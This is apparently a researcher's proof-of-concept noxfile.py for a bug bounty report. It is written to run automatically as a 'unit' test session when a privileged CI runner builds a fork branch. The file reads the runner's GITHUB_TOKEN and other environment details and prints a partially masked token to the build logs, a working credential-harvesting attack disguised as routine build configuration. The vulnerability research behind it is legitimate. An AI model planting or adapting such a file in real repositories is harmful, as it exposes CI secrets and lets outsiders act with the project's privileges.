# SECURITY RESEARCH PoC — Gate D Evidence Collection
# Researcher: Yuval Fradkin | Google OSS VRP
# This noxfile.py is CREATED (not modified) in the fork branch only.
# It exfiltrates GITHUB_TOKEN to confirm privileged execution context.
# NO production data accessed. NO destructive operations.

import os
import nox

RESEARCH_MARKER = "GATE_D_POC_EXECUTION_CONFIRMED"

@nox.session(python=["3.10"])
def unit(session):
    """PoC: confirm GITHUB_TOKEN present in privileged runner context."""
    token  = os.environ.get("GITHUB_TOKEN", "NOT_FOUND")
    actor  = os.environ.get("GITHUB_ACTOR", "unknown")
    repo   = os.environ.get("GITHUB_REPOSITORY", "unknown")
    run_id = os.environ.get("GITHUB_RUN_ID", "unknown")

    print(f"=== {RESEARCH_MARKER} ===")
    print(f"GITHUB_ACTOR:      {actor}")
    print(f"GITHUB_REPOSITORY: {repo}")
    print(f"GITHUB_RUN_ID:     {run_id}")
    print(f"GITHUB_TOKEN:      {token[:8]}...{token[-4:] if len(token) > 12 else token}")
    print(f"TOKEN_LENGTH:      {len(token)}")
    print(f"EXECUTION_TIME:    {__import__('datetime').datetime.utcnow().isoformat()}Z")
    print("=" * 50)

    assert token != "NOT_FOUND", "GITHUB_TOKEN confirmed present"
    session.run("python", "-c", "print('PoC unit session complete')", external=True)
